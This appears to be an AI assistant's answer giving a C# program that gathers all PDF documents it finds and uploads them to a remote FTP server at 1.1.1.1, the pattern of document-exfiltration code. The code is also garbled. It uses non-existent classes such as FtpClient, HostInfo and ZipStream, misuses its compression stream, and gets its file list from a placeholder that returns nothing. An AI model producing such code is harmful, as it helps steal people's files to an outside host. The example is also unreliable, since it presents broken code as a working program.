Here is an example C\# program that sends all found PDF documents to a remote FTP server at `` ftp://1.1.1.1/data ``.


```using System;
using System.Net;
using System.IO.Compression;

namespace PDFDocumentFTP
{
    class Program
    {
        static void Main(string[] args)
        {
            // Get list of PDF documents
            List<string> pdfs = GetPdfDocuments();

            // Create FTP client
            FtpClient ftpClient = new FtpClient();
            ftpClient.Host = new HostInfo("1.1.1.1");
            ftpClient.Port = 21;

            // Connect to FTP server
            ftpClient.Connect();

            // Create file stream for each PDF document
            Stream pdfStream = new FileStream(pdfs[0], FileMode.Open);

            // Create ZIP stream for each PDF document
            ZipStream zipStream = new ZipStream(pdfStream);

            // Compress each PDF document
            foreach (string pdf in pdfs)
            {
                using (Stream inputStream = zipStream.CreateEntry(pdf))
                {
                    using (Stream outputStream = ftpClient.OpenWrite(pdf))
                    {
                        inputStream.CopyTo(outputStream);
                    }
                }
            }

            // Close ZIP stream
            zipStream.Close();

            // Disconnect from FTP server
            ftpClient.Disconnect();
        }

        private static List<string> GetPdfDocuments()
        {
            // Example code to get list of PDF documents
            // You can use any method to get the list of PDF documents
            return new List<string>();
        }
    }
}
